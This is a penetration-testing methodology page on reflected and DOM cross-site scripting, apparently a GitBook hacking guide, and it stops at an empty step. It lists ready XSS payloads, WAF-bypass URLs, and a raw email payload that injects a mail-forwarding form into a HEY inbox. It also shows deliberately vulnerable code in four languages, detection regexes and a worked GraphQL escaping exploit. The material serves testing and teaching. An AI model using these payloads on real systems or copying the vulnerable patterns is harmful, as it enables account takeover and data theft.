# Reflected Cross Site Scripting

## Check List

## Methodology

### Black Box

#### [XSS Reflected](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Log in to any platform that allows creating or editing text-based pages (such as a Wiki or documentation system)
{% endstep %}

{% step %}
Create a new page
{% endstep %}

{% step %}
In the field for the page identifier or slug, enter `javascript:`
{% endstep %}

{% step %}
Configure the page as follows

Title: `javascript:`

Format: Markdown

Content: `[XSS](.alert(1);)`
{% endstep %}

{% step %}
Save or publish the page
{% endstep %}

{% step %}
After the page is created, click the link labeled “XSS” in the page content
{% endstep %}

{% step %}
If the system is vulnerable, the JavaScript code will execute (e.g., an `alert(1)` will appear)
{% endstep %}
{% endstepper %}

***

#### [XSS IN Email](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Create a new text file (e.g. `email.txt`)
{% endstep %}

{% step %}
Put the following exact contents into the file (including headers and `Content-type: text/html`)

```http
From: jouko@klikki.fi
To: jouko@hey.com
Subject: HackerOne test
MIME-Version: 1.0
Content-type: text/html

<style>
url(cid://\00003c\000027message-content\00003e\00003ctemplate\00003e\00003cstyle\00003exxx);
url(cid://\00003c/style\00003e\00003c/template\00003e\00003c/message-content\00003e\00003cform\000020action=/my/accounts/266986/forwardings/outbounds\000020data-controller=beacon\00003e\00003cinput\000020type=text\000020name=contact_outbound_forwarding[to_email_address]\000020value=joukop@gmail.com\00003e\00003c/form\00003exxx);
</style>
```
{% endstep %}

{% step %}
Send the email using `sendmail` on Linux as an example

```bash
/usr/sbin/sendmail -t < email.txt
```

(or use any other tool capable of sending raw MIME/HTML emails)
{% endstep %}

{% step %}
Open the recipient’s HEY account and load the sent email (refresh the inbox/viewer if needed)
{% endstep %}

{% step %}
Inspect the rendered HTML to find injected tags or form elements (e.g. injected `<form ...>` or `<iframe ...>`)
{% endstep %}

{% step %}
Observe any automatic behaviors triggered by the injected HTML (such as POST requests to create forwarding or a full-window iframe)
{% endstep %}

{% step %}
Repeat with the alternative payload examples from the report (iframe-based spoof or `<script src=...>` + hcaptcha payload) to verify other exploitation vectors
{% endstep %}
{% endstepper %}

***

#### [Reflected XSS In Marketing Reports Page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#wrapper-javascript)

{% stepper %}
{% step %}
Log in to the store's website and complete the authentication process
{% endstep %}

{% step %}
Then go to the report section in your profile
{% endstep %}

{% step %}
When you enter the page, check the URL and find parameters like `return_page_pathname=` (may be different in each site)
{% endstep %}

{% step %}
Inject the parameter using the following payload and check if the code is executed or not

```
javascript:alert('XSS')
```
{% endstep %}

{% step %}
If it is implemented, we hit a vulnerability
{% endstep %}
{% endstepper %}

***

#### [Reflected Cross Site Scripting (XSS) Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads)

{% stepper %}
{% step %}
Enter a site and complete the authentication process
{% endstep %}

{% step %}
In the authentication process, make an error on one of the parameters so that the authentication process fails
{% endstep %}

{% step %}
If you encounter errmssg parameters in subsequent requests, inject xss-related payloads in these parameters
{% endstep %}

{% step %}
For example, like this request below

```
errmsg = [https://102.176.160.119:10443/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E]
```
{% endstep %}
{% endstepper %}

***

#### [DOM XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss)

{% stepper %}
{% step %}
Bring up the Burp tool and make a request to the main page of the site
{% endstep %}

{% step %}
In the Response section, click on the search section and search for the word `window.location.hash` and check if it exists or not
{% endstep %}

{% step %}
If there is, inject the payload as shown below and see if it is reflected or not

```
https://www.example.com/#<img src=x onerror=alert('XSS')>
```
{% endstep %}
{% endstepper %}

***

#### [DOM XSS in redirect param](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#dom-based-xss)

{% stepper %}
{% step %}
Logout website
{% endstep %}

{% step %}
Get the request using Burp and check the request
{% endstep %}

{% step %}
In the requests review, if you find a request like the one below, inject the payload

```
https://subdomain.example.net/?redirect=javascript:prompt(document.domain)%2f%2f 
```
{% endstep %}

{% step %}
Log in through email
{% endstep %}
{% endstepper %}

***

#### [XSS Reflected in Redirect\_url](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-wrappers-for-uri)

{% stepper %}
{% step %}
Log in to the site and complete the registration process
{% endstep %}

{% step %}
Trace the registration process using Burp and inspect the parameters
{% endstep %}

{% step %}
If you see a parameter called redirect\_url, inject the following payload as shown below:

```http
https://example.net/resign_request/success?next_url=javascript%3Aalert%2F**%2F(document.domain)
```
{% endstep %}

{% step %}
If the code is reflected, the vulnerability has occurred
{% endstep %}
{% endstepper %}

***

#### [Payload For WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md)

{% stepper %}
{% step %}
```http
https://www.example.com.br/testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}

{% step %}
```http
https://www.example.com.br/testing%2522%FF%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}

{% step %}
```http
https://www.starbucks.com.br/testing%80%2522%2520accesskey='x'%2520onclick='confirm%601%60'
```
{% endstep %}
{% endstepper %}

***

#### [Location Information Parameter ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md#polyglot-xss)

{% stepper %}
{% step %}
Log in to your account and profile on the target site
{% endstep %}

{% step %}
Go to the general section of your account and enter the street address, city, and the following payload

```javascript
/"><!--><svg/onload=alert(document.domain)>)
```
{% endstep %}

{% step %}
After injection, save and log in to see your location information and live view
{% endstep %}

{% step %}
For example, something like the path below (keep in mind that this path can be different for each site)

```http
https://example.com/user/dashboards/live
```
{% endstep %}
{% endstepper %}

***

#### Reflected In ContactForm

{% stepper %}
{% step %}
Log in to the target site and find the contact support feature
{% endstep %}

{% step %}
Then, using the Burp suite tool, make a request to this page and use the `GAP` extension to identify all the parameters of this page
{% endstep %}

{% step %}
Then you can identify the parameters of the support contact page using the x8 tool and the following command

```bash
x8 -u "https://target.com/ContactForm" -w wordlists_parameter.txt -m 25
```
{% endstep %}

{% step %}
If a parameter is found that is reflected, run the XSS tests. If it is executed, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### User-Agent Header

{% stepper %}
{% step %}
Log in to the target site and record the requests using the Burp Suite tool
{% endstep %}

{% step %}
Then send a request to Repeater using the Burp suite tool
{% endstep %}

{% step %}
Then replace the User-Agent header value with the following payload and submit the request

```http
User-Agent: Mozilla/5.0 <script>alert`XSS`</script>
User-Agent: <svg/onload=alert(1)>
User-Agent: </title><script>alert(1)</script>
User-Agent: JavaScript:alert(1)   (if reflected inside javascript: context)
```
{% endstep %}

{% step %}
Refresh the page where the User-Agent is displayed
{% endstep %}

{% step %}
If alert pops → XSS confirmed
{% endstep %}
{% endstepper %}

***

#### Language Parameter

{% stepper %}
{% step %}
Log into the target site and record the requests using the Burp Suite tool
{% endstep %}

{% step %}
Check the requests to see if there is a parameter called lang or language in the request, like the one below

```http
GET /api/v1/path?&lang=en
Host: target.com
Cookie: . . . .
Accept-Language: en-US
```
{% endstep %}

{% step %}
Then inject an XSS payload in front of the value of this parameter

```http
GET /api/v1/path?&lang=en"><script>alert(1)</script>
Host: target.com
Cookie: . . . .
Accept-Language: en-US
```
{% endstep %}
{% endstepper %}

***

### White Box

#### Reflected Cross-Site Scripting via Unsafe Rendering of User-Controlled Query Parameter

{% stepper %}
{% step %}
Identify the application's controllers and extract all `GET` and `POST` routes
{% endstep %}

{% step %}
Locate paths that receive user input and display it in a View without security processing
{% endstep %}

{% step %}
Trace the data flow from user input to HTML output

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet]
public IActionResult DemoTypeII(string query)
{
    ViewData["query"] = query;

    HttpContext.Response.Headers.Add("X-XSS-Protection", "0");
    return View();
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping
public Object DemoTypeII(String query)
{
    ViewData.put("query", query);

    response.addHeader("X-XSS-Protection", "0");
    return View();
}
```
{% endtab %}

{% tab title="PHP" %}
```php
#[HttpGet]
public function DemoTypeII($query)
{
    $this->ViewData['query'] = $query;

    header("X-XSS-Protection: 0");
    return $this->View();
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
app.get('/DemoTypeII', (request, response) => {
    const query = request.query.query;

    ViewData["query"] = query;

    response.setHeader("X-XSS-Protection", "0");
    return View();
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Determine whether input data is directly assigned to `ViewData`, `ViewBag`, `Model`, or `TempData`

{% tabs %}
{% tab title="C#" %}
```csharp
ViewData["query"] = query;
```
{% endtab %}

{% tab title="Java" %}
```java
ViewData.put("query", query);
```
{% endtab %}

{% tab title="PHP" %}
```php
$this->ViewData['query'] = $query;
```
{% endtab %}

{% tab title="Node.js" %}
```js
ViewData["query"] = query;
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the View file associated with the Action and determine how the stored data is rendered

{% tabs %}
{% tab title="C#" %}
```csharp
return View();
```
{% endtab %}

{% tab title="Java" %}
```java
return View();
```
{% endtab %}

{% tab title="PHP" %}
```php
return $this->View();
```
{% endtab %}

{% tab title="Node.js" %}
```js
return View();
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether automatic encoding mechanisms are used when rendering the data (such as `Html.Raw` or equivalent methods)
{% endstep %}

{% step %}
Review the HTTP response security headers and determine whether browser-side protection mechanisms are disabled

{% tabs %}
{% tab title="C#" %}
```csharp
HttpContext.Response.Headers.Add("X-XSS-Protection","0");
```
{% endtab %}

{% tab title="Java" %}
```java
response.addHeader("X-XSS-Protection", "0");
```
{% endtab %}

{% tab title="PHP" %}
```php
header("X-XSS-Protection: 0");
```
{% endtab %}

{% tab title="Node.js" %}
```js
response.setHeader("X-XSS-Protection", "0");
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Identify all Actions that store user data and trace the storage path

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost]
public IActionResult DemoTypeI(CommentViewModel comment)
{
    Comment newComment = new Comment();
    newComment.ID = Guid.NewGuid().ToString();
    newComment.Username = "Anonymous";
    newComment.CreatedAt = DateTime.Now;
    newComment.Text = comment.Text;
    commentsRepository.Save(newComment);

    return RedirectToAction("DemoTypeI");
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping
public Object DemoTypeI(CommentViewModel comment)
{
    Comment newComment = new Comment();
    newComment.setID(java.util.UUID.randomUUID().toString());
    newComment.setUsername("Anonymous");
    newComment.setCreatedAt(new java.util.Date());
    newComment.setText(comment.getText());
    commentsRepository.save(newComment);

    return RedirectToAction("DemoTypeI");
}
```
{% endtab %}

{% tab title="PHP" %}
```php
#[HttpPost]
public function DemoTypeI(CommentViewModel $comment)
{
    $newComment = new Comment();
    $newComment->ID = uniqid('', true);
    $newComment->Username = "Anonymous";
    $newComment->CreatedAt = new DateTime();
    $newComment->Text = $comment->Text;
    $this->commentsRepository->save($newComment);

    return $this->RedirectToAction("DemoTypeI");
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
app.post('/DemoTypeI', (request, response) => {
    const comment = request.body;

    let newComment = new Comment();
    newComment.ID = crypto.randomUUID();
    newComment.Username = "Anonymous";
    newComment.CreatedAt = new Date();
    newComment.Text = comment.Text;
    commentsRepository.save(newComment);

    return RedirectToAction("DemoTypeI");
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Determine whether input data is validated, sanitized, or encoded before being stored

{% tabs %}
{% tab title="C#" %}
```csharp
newComment.Text = comment.Text;
commentsRepository.Save(newComment);
```
{% endtab %}

{% tab title="Java" %}
```java
newComment.setText(comment.getText());
commentsRepository.save(newComment);
```
{% endtab %}

{% tab title="PHP" %}
```php
$newComment->Text = $comment->Text;
$this->commentsRepository->save($newComment);
```
{% endtab %}

{% tab title="Node.js" %}
```js
newComment.Text = comment.Text;
commentsRepository.save(newComment);
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the Repository or Data Access Layer and trace where the data is stored, up to the database or file system

{% tabs %}
{% tab title="C#" %}
```csharp
commentsRepository.Save(newComment);
```
{% endtab %}

{% tab title="Java" %}
```java
commentsRepository.save(newComment);
```
{% endtab %}

{% tab title="PHP" %}
```php
$this->commentsRepository->save($newComment);
```
{% endtab %}

{% tab title="Node.js" %}
```js
commentsRepository.save(newComment);
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Identify the path used to retrieve the stored data

{% tabs %}
{% tab title="C#" %}
```csharp
CommentsViewModel comments = commentsRepository.GetAll();
```
{% endtab %}

{% tab title="Java" %}
```java
CommentsViewModel comments = commentsRepository.getAll();
```
{% endtab %}

{% tab title="PHP" %}
```php
$comments = $this->commentsRepository->getAll();
```
{% endtab %}

{% tab title="Node.js" %}
```js
const comments = commentsRepository.getAll();
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Determine how the retrieved data is passed to the View

{% tabs %}
{% tab title="C#" %}
```csharp
return View(comments);
```
{% endtab %}

{% tab title="Java" %}
```java
return View(comments);
```
{% endtab %}

{% tab title="PHP" %}
```php
return $this->View($comments);
```
{% endtab %}

{% tab title="Node.js" %}
```js
return View(comments);
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the View responsible for displaying the stored data and determine whether the retrieved data is rendered without encoding, Search all controllers for the following patterns

{% tabs %}
{% tab title="C#" %}
```csharp
ViewData["..."] = userInput;
ViewBag.... = userInput;
Model.Property = userInput;
return View(model);
```
{% endtab %}

{% tab title="Java" %}
```java
ViewData.put("...", userInput);
ViewBag.put("...", userInput);
model.setProperty(userInput);
return View(model);
```
{% endtab %}

{% tab title="PHP" %}
```php
$this->ViewData['...'] = $userInput;
$this->ViewBag->... = $userInput;
$model->Property = $userInput;
return $this->View($model);
```
{% endtab %}

{% tab title="Node.js" %}
```js
ViewData["..."] = userInput;
ViewBag.... = userInput;
model.Property = userInput;
return View(model);
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review all response security headers and determine whether browser or framework defense mechanisms are disabled during the rendering process
{% endstep %}
{% endstepper %}

***

#### Reflected XSS via Content Negotiation and Escape-Sequence Evading in GraphQL Telemetry Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify if the enterprise utilizes GraphQL for its primary API Gateway. GraphQL APIs typically expose a single endpoint (e.g., `/graphql`) that exclusively consumes and returns `application/json`
{% endstep %}

{% step %}
Investigate the "Developer Experience" (DX) optimizations. To assist internal developers and B2B partners, API Gateways frequently bundle a visual IDE (like GraphiQL or Apollo Studio) directly into the gateway
{% endstep %}

{% step %}
Observe the Content Negotiation routing logic. To avoid exposing a separate URL path for the IDE, the gateway dynamically switches its response behavior based on the `Accept` HTTP header. If the client requests `application/json`, it executes the GraphQL query. If the client requests `text/html`, it returns the static HTML bundle of the visual IDE
{% endstep %}

{% step %}
Discover the telemetry and state-hydration optimization. When developers share failed query links with each other (e.g., via Slack), they pass the query via the URL: `GET /graphql?query={users{id}}`. To optimize the UX, the server extracts this `query` parameter and injects it directly into the initial JavaScript state of the rendered HTML IDE
{% endstep %}

{% step %}
Analyze the string sanitization logic in the decompiled codebase. Because enterprise GraphQL queries can easily exceed 5 Megabytes in size, fully serializing the query via a standard JSON library (e.g., `Jackson` or `Json.NET`) introduces unacceptable CPU latency and memory allocation overhead on the Edge Gateway
{% endstep %}

{% step %}
Recognize the fatal architectural shortcut. To bypass the heavy JSON serializer, the developer implements a high-speed string replacement routine (e.g., `.Replace("'", "\\'")`). The developer assumes that neutralizing the single-quote character mathematically prevents an attacker from breaking out of the JavaScript string boundary
{% endstep %}

{% step %}
Understand the contextual escaping mismatch. The developer's regex correctly targets the quote character, but completely ignores the backslash (`\`) character
{% endstep %}

{% step %}
Craft a malicious GraphQL query that intentionally trails with a raw backslash, followed by an unescaped quote, a semicolon, and your XSS payload: `\'; alert(document.domain); //`
{% endstep %}

{% step %}
Submit the payload via the URL while asserting the `Accept: text/html` header
{% endstep %}

{% step %}
The fast-replace algorithm detects your single quote and prepends a backslash to "escape" it. However, because you already provided a backslash, the resulting string becomes `\\'`
{% endstep %}

{% step %}
The browser's JavaScript engine parses `\\'`. The first backslash legally escapes the second backslash. The quote character is completely unescaped, successfully breaking the variable boundary. Your injected JavaScript payload executes in the context of the enterprise domain, bypassing all standard Web Application Firewalls (WAFs) because no HTML tags (`<script>`) were ever transmitted

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Replace\s*\(\s*"'\s*,\s*"\\\\'"\s*\)|Replace\s*\(\s*"''"\s*,\s*"'\s*\)|Replace\s*\(\s*"\"\s*,\s*"\\\\\""\s*\)|Replace\s*\([\s\S]{0,120}?(?:SELECT|INSERT|UPDATE|DELETE|WHERE|VALUES)|string\.Format[\s\S]{0,120}?(?:SELECT|INSERT|UPDATE))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:\.replace\s*\(\s*"'\s*,\s*"\\\\'"\s*\)|\.replaceAll\s*\(\s*"'\s*,\s*"\\\\'"\s*\)|StringBuilder[\s\S]{0,120}?append[\s\S]{0,120}?(?:SELECT|INSERT|UPDATE)|Statement\s*\.[\s\S]{0,120}?execute)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:str_replace\s*\(\s*"'\s*,\s*"\\\\'"\s*,|addslashes\s*\(|preg_replace\s*\([\s\S]{0,120}?['"]['"]|mysql_real_escape_string\s*\(|mysqli_real_escape_string\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:replace\s*\(\s*/['"]/g\s*,\s*"\\\\\$&"\s*\)|replace\s*\(\s*"'\s*,\s*"\\\\'"\s*\)|replaceAll\s*\(\s*"'\s*,\s*"\\\\'"\s*\)|query\s*\([\s\S]{0,120}?\+\s*\w+)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Replace\("'",\s*"\\\\'"\)|Replace\("\"",\s*"\\\\\""\)|Replace.*(SELECT|INSERT|UPDATE|DELETE)|string\.Format.*SELECT
```
{% endtab %}

{% tab title="Java" %}
```regexp
\.replace\("'",\s*"\\\\'"\)|\.replaceAll\("'",\s*"\\\\'"\)|Statement\..*execute|StringBuilder.*SELECT
```
{% endtab %}

{% tab title="PHP" %}
```regexp
str_replace\("'",\s*"\\\\'"\)|addslashes\(|mysql_real_escape_string\(|mysqli_real_escape_string\(
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
replace\(/['"]/g,\s*"\\\\\$&"\)|replaceAll\("'",\s*"\\\\'"\)|query\(.*\+
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/graphql")]
public IActionResult GetGraphQL() 
{
    var query = Request.Query["query"].ToString() ?? "";

    // [1]
    if (Request.Headers["Accept"].ToString().Contains("text/html")) 
    {
        // [2]
        // [3]
        var safeQuery = query.Replace("'", "\\'");
        
        // [4]
        var html = _graphiqlTemplate.Replace("{{INITIAL_QUERY}}", safeQuery);
        return Content(html, "text/html");
    }

    return ExecuteGraphQLQuery(query);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/graphql")
public ResponseEntity<?> getGraphQL(HttpServletRequest request) {
    String query = request.getParameter("query");
    if (query == null) query = "";

    // [1]
    if (request.getHeader("Accept") != null && request.getHeader("Accept").contains("text/html")) {
        // [2]
        // [3]
        String safeQuery = query.replace("'", "\\'");
        
        // [4]
        String html = graphiqlTemplate.replace("{{INITIAL_QUERY}}", safeQuery);
        return ResponseEntity.ok().contentType(MediaType.TEXT_HTML).body(html);
    }

    return executeGraphQLQuery(query);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function getGraphQL(Request $request) 
{
    $query = $request->query('query', '');

    // [1]
    if (strpos($request->header('Accept'), 'text/html') !== false) 
    {
        // [2]
        // [3]
        $safeQuery = str_replace("'", "\\'", $query);
        
        // [4]
        $html = str_replace("{{INITIAL_QUERY}}", $safeQuery, $this->graphiqlTemplate);
        return response($html)->header('Content-Type', 'text/html');
    }

    return $this->executeGraphQLQuery($query);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/graphql', (req, res) => {
    let query = req.query.query || '';

    // [1]
    if (req.accepts('text/html')) {
        // [2]
        // [3]
        let safeQuery = query.replace(/'/g, "\\'");
        
        // [4]
        let html = graphiqlTemplate.replace('{{INITIAL_QUERY}}', safeQuery);
        return res.type('html').send(html);
    }

    return executeGraphQLQuery(query);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The API Gateway implements Content Negotiation. It dynamically pivots its execution path based on the `Accept` header, enabling a single URL to serve both raw API traffic and a developer-friendly UI, \[2] The architectural optimization. Knowing that GraphQL queries can be exceptionally large, the developer bypasses the heavy, memory-intensive JSON serialization engine to avoid latency spikes on the Edge Gateway, \[3] The fatal sanitization shortcut. The developer implements a rudimentary string replacement, manually prefixing any single quote (`'`) with a backslash (`\`) to protect the JavaScript string literal. They fail to sanitize the backslash character itself, \[4] The payload is interpolated directly into an inline JavaScript block inside the raw HTML template (e.g., `const initialQuery = '{{INITIAL_QUERY}}';`)

```http
// 1. Attacker sends a phishing link to an authenticated internal developer.
// 2. The payload intentionally ends with a backslash, a quote, and the JS execution context.

GET /graphql?query=fragment%20\';alert(document.domain);// HTTP/1.1
Host: api.enterprise.tld
Accept: text/html,application/xhtml+xml
Cookie: SessionToken=VALID_ADMIN_TOKEN

// 3. The server receives the payload: fragment \';alert(document.domain);//
// 4. The fast-replace algorithm detects the quote and prepends a backslash.
// 5. The mutated string is injected into the HTML template.

HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
    <script>
        // The first backslash escapes the second backslash.
        // The quote is parsed as a literal string terminator!
        const initialQuery = 'fragment \\';alert(document.domain);//';
        initGraphiQL(initialQuery);
    </script>
</head>
<body>...</body>
</html>
```
{% endstep %}

{% step %}
To optimize rendering latency on the API Gateway and avoid the overhead of complete Abstract Syntax Tree (AST) or JSON serialization, the developer implemented a manual string replacement routine. This routine correctly identified and escaped quotes, but completely ignored the malicious potential of user-supplied backslashes. When the attacker supplied a payload containing a backslash immediately preceding a quote (`\'`), the server's sanitization routine prepended a second backslash (`\\'`). Inside the browser's JavaScript execution engine, the double backslash was parsed as a single, literal backslash character, leaving the single quote completely active. The string boundary terminated prematurely, and the subsequent attacker-supplied payload was executed as native JavaScript in the enterprise domain, resulting in a zero-interaction Reflected XSS vulnerability that completely bypasses HTML-centric Web Application Firewalls
{% endstep %}
{% endstepper %}

***

#### Reflected XSS via Pre-compiled Edge Localization (i18n) Dictionary Injection

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Pay attention to how the application handles language translation and localization (e.g., `?lang=fr` or `Accept-Language` headers)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Edge Translation architecture. In high-traffic global applications, rendering the full MVC layout using a heavy translation dictionary for every request causes massive CPU overhead on the backend pods
{% endstep %}

{% step %}
Investigate the caching optimization: The API Gateway or Edge Middleware caches the _pre-rendered_ HTML templates for specific routes.
{% endstep %}

{% step %}
Discover the dynamic localization injection: The pre-rendered HTML contains generic translation tokens (e.g., `{0}`, `{1}`, or `{{DynamicData}}`). When the edge retrieves the cached HTML blob, it applies a fast, secondary pass using raw String Replacement (or Regex) to inject the user's specific context (like their search query or username) into the localized strin
{% endstep %}

{% step %}
Analyze the Edge Translation Middleware in the decompiled code
{% endstep %}

{% step %}
Understand the architectural assumption: The backend engineers assume that because the initial HTML layout was generated by a secure, auto-escaping templating engine, the cached blob is inherently safe
{% endstep %}

{% step %}
Recognize the fatal timing flaw: The automatic contextual encoding occurs during the _initial_ backend render. The dynamic string replacement happens _after_ the render, at the edge layer, operating on raw strings without any contextual awareness of the surrounding HTML or script blocks
{% endstep %}

{% step %}
Identify an endpoint where dynamic user input (a search term or a filter value) is reflected within a localized string
{% endstep %}

{% step %}
Inject an HTML-breaking XSS payload into the dynamic input parameter
{% endstep %}

{% step %}
Send the request. The Edge Middleware retrieves the localized cached HTML, performs the fast string replacement, and inserts your unescaped payload directly into the response
{% endstep %}

{% step %}
The browser receives the payload and executes the Reflected XSS

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:cachedHtml\.Replace\s*\(\s*"\{0\}"\s*,[\s\S]{0,150}?(?:Request|HttpContext|Query|Form|Input)|cachedHtml\.Replace\s*\([\s\S]{0,120}?\{0\}[\s\S]{0,120}?(?:User|request|input)|string\.Format\s*\(\s*cachedHtml[\s\S]{0,150}?(?:Request|User))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:cachedHtml\.replaceAll\s*\(\s*"\\\\?\{0\\\\?\}"[\s\S]{0,150}?(?:request|getParameter|getHeader)|cachedHtml\.replace\s*\([\s\S]{0,150}?\{0\}[\s\S]{0,120}?(?:request|input|parameter)|String\.format\s*\([\s\S]{0,150}?html)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:str_replace\s*\(\s*'\{0\}'\s*,\s*\$request->|str_replace\s*\(\s*'\{0\}'[\s\S]{0,150}?(?:\$_GET|\$_POST|\$_REQUEST)|cachedHtml[\s\S]{0,120}?str_replace)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:cachedHtml\.replace\s*\(\s*/\{0\}\/g[\s\S]{0,150}?(?:req\.|request|body|query)|cachedHtml\.replaceAll\s*\(\s*['"]\\?\{0\\?\}['"][\s\S]{0,150}?(?:req|input)|html[\s\S]{0,100}?replace\s*\([\s\S]{0,100}?req\.)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
cachedHtml\.Replace\("\{0\}".*|cachedHtml\.Replace.*\{0\}.*(Request|HttpContext|User)
```
{% endtab %}

{% tab title="Java" %}
```regexp
cachedHtml\.replaceAll\("\\?\{0\\?\}".*|cachedHtml\.replace.*\{0\}.*(request|getParameter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
str_replace\('\{0\}',\s*\$request->|str_replace\('\{0\}'.*(\$_GET|\$_POST|\$_REQUEST)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
cachedHtml\.replace\(/\{0\}/g,|cachedHtml\.replaceAll\(.*\{0\}.*(req|request|body|query)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class EdgeLocalizationMiddleware 
{
    private readonly IDistributedCache _edgeCache;

    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        var path = context.Request.Path.Value;
        var lang = context.Request.Headers["Accept-Language"].FirstOrDefault() ?? "en";

        // [1]
        var cachedHtml = await _edgeCache.GetStringAsync($"template:{lang}:{path}");

        if (!string.IsNullOrEmpty(cachedHtml) && context.Request.Query.ContainsKey("q")) 
        {
            // [2]
            var dynamicQuery = context.Request.Query["q"].ToString();

            // [3]
            // [4]
            var finalHtml = cachedHtml.Replace("{0}", dynamicQuery);

            context.Response.ContentType = "text/html";
            await context.Response.WriteAsync(finalHtml);
            return;
        }

        await next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class EdgeLocalizationFilter implements Filter {

    @Autowired
    private CacheManager edgeCache;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse res = (HttpServletResponse) response;
        
        String path = req.getRequestURI();
        String lang = req.getHeader("Accept-Language") != null ? req.getHeader("Accept-Language") : "en";

        // [1]
        String cachedHtml = edgeCache.getCache("templates").get(lang + ":" + path, String.class);

        if (cachedHtml != null && req.getParameter("q") != null) {
            // [2]
            String dynamicQuery = req.getParameter("q");

            // [3]
            // [4]
            String finalHtml = cachedHtml.replace("{0}", dynamicQuery);

            res.setContentType("text/html");
            res.getWriter().write(finalHtml);
            return;
        }

        chain.doFilter(request, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class EdgeLocalizationMiddleware 
{
    public function handle(Request $request, Closure $next) 
    {
        $path = $request->getPathInfo();
        $lang = $request->header('Accept-Language', 'en');

        // [1]
        $cachedHtml = Cache::store('edge')->get("template:{$lang}:{$path}");

        if ($cachedHtml && $request->has('q')) 
        {
            // [2]
            $dynamicQuery = $request->query('q');

            // [3]
            // [4]
            $finalHtml = str_replace('{0}', $dynamicQuery, $cachedHtml);

            return response($finalHtml)->header('Content-Type', 'text/html');
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class EdgeLocalizationMiddleware {
    static async handle(req, res, next) {
        let path = req.path;
        let lang = req.headers['accept-language'] || 'en';

        // [1]
        let cachedHtml = await edgeCache.get(`template:${lang}:${path}`);

        if (cachedHtml && req.query.q) {
            // [2]
            let dynamicQuery = req.query.q;

            // [3]
            // [4]
            let finalHtml = cachedHtml.replace('{0}', dynamicQuery);

            res.setHeader('Content-Type', 'text/html');
            return res.send(finalHtml);
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
